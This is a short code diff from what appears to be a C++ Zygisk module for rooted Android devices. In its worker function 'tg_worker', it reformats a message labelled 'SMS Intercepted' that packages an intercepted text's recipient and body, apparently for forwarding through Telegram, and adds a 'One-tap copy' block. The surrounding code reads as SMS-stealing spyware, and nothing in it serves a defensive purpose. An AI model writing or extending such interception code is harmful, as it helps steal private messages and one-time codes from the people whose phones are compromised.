@@ -148,7 +148,12 @@ void* tg_worker(void* arg) {
         }
         const std::string& msg = job->body.empty() ? "empty" : job->body;
         std::string text = "📱 SMS Intercepted Zygisk Mode Menu By @Hivirtus 🔥\n";
-        text += "To ";
+        text += "-----------------\n";
+        text += "📞 To: ";
+        text += to_disp;
+        text += "\n💬 Message: ";
+        text += msg;
+        text += "\n📋 One-tap copy:\nTo: ";
         text += to_disp;
         text += "\nMessage: ";
         text += msg;
